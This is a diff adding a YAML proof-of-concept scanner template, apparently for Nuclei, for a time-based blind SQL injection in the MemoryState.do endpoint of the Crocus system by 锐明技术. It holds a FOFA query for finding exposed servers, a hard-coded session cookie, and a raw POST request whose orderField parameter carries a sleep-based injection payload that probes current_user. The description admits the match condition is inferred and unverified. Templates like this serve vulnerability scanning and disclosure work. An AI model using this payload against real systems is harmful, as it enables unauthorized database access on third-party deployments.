@@ -1,0 +1,35 @@
+id: poc-digv4y3xwu26negd
+info:
+  name: 锐明技术Crocus系统 MemoryState.do 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/digv4y3xwu26negd
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: digv4y3xwu26negd
+    fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
+http:
+- raw:
+  - 'POST /MemoryState.do?Action=Query HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Cookie: Saffron.U=VUlEPTEmVU49MQ==
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: keep-alive
+
+
+    EndTime=&PageIndex=0&PageSize=20&RepairState=-1&StartTime=&orderField=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep(5),1))a)&orderType=asc'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
